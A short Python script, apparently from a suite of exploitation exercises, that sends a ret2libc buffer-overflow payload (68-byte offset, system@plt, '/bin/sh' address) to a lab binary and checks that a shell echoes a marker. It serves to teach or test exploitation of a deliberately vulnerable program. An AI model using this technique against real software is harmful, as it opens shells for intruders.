from common import BUILD, execute, p32, plt, print_result, symbols

binary = BUILD / "ret2libc1_32"
sym = symbols(binary)
system_plt = plt(binary, "system")
exit_plt = plt(binary, "exit")
payload = b"A" * 68 + p32(system_plt) + p32(exit_plt) + p32(sym["binsh"]) + p32(0)
print(
    f"[ret2libc1] offset=68, system@plt=0x{system_plt:08x}, "
    f"/bin/sh=0x{sym['binsh']:08x}"
)
status, output = execute(binary, [payload], b"echo RET2LIBC1_OK\nexit\n")
print_result("ret2libc1", status, output, "RET2LIBC1_OK")
